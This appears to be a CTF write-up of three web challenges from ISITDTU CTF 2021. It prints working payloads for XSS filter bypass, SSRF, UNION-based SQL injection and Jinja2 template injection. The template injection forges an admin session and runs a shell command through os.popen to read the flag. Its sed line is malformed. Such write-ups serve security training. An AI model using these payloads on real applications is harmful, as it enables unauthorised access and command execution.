# Simple WAF 

![image](https://user-images.githubusercontent.com/39853984/143730030-622faeba-50e3-4a66-97b0-36ab698bee59.png)


Payload: https://simplewaf.duckdns.org/6ef051ac3d7b644cb6b3c22fef5677a1/?xss=%3Ciframe%0Dsrc%20=%22javascript:alert()%22%3E

# Ez SQL 

Source Code: https://github.com/DauHoangTai/My-CTF-Challenges/tree/main/ISITDTU_CTF/2021

![image](https://user-images.githubusercontent.com/39853984/143730094-56434a77-8f8f-4802-9158-25a07f6b1dc0.png)

Bypass and achieve SSRF with: http://make-127-0-0-2-rr.1u.ms

![image](https://user-images.githubusercontent.com/39853984/143730113-16b30413-57b0-4a65-8c38-54f79115bb90.png)

Bypass and achieve SQLI with: 2 union select \`3\`,\`4\` from (select 1,2,3,4 union select * from users)aa

# Warmup 

Source Code: https://github.com/DauHoangTai/My-CTF-Challenges/tree/main/ISITDTU_CTF/2021

register is impossible, login with else sentence in login route. Calculate the captcha to login as Guest

![image](https://user-images.githubusercontent.com/39853984/143730187-816eae57-4131-412b-b825-abdf562069e7.png)

My teammate did this xor. Too ez to save a file...

![image](https://user-images.githubusercontent.com/39853984/143730211-ab44380a-2868-41df-988d-81627142fc09.png)

With Guest permission, can play a bit SSTI with 56 chars and some filter 

![image](https://user-images.githubusercontent.com/39853984/143730234-ac38d60d-022c-4488-b7b2-866be2855fd3.png)

Craft cookie of admin by SSTI.

Payload: {%if session.update({'username':'admin'})%}{%endif%} {%if session.update({'check':1})%}{%endif%}

With Admin permission can do more SSTI with more character and more filter

![image](https://user-images.githubusercontent.com/39853984/143730249-c332f02a-b62a-4aa4-ab39-341a9d910ea3.png)

Bypass filter with some technical (user '\[]' to not use '.', use glo''bals to not use globals, ... ). Add flag into session to read

Payload: 

```
{%if session.update({'flag':cycler['__init__']['__glo' 'bals__']['os']['po' 'pen']('cat /flag')['re' 'ad']()})%}{%endif%}
```

Flag has some special characters which break the session, make it can not print in session. Try some sed to filter out special character 

```
cat /flag | sed "sed "/^[a-zA-Z]//g"
```

Got 34/45 characters of flag, useless. My teammate and his ancestors make the flag complete and got the point. Kudos to my teammate and his ancestors
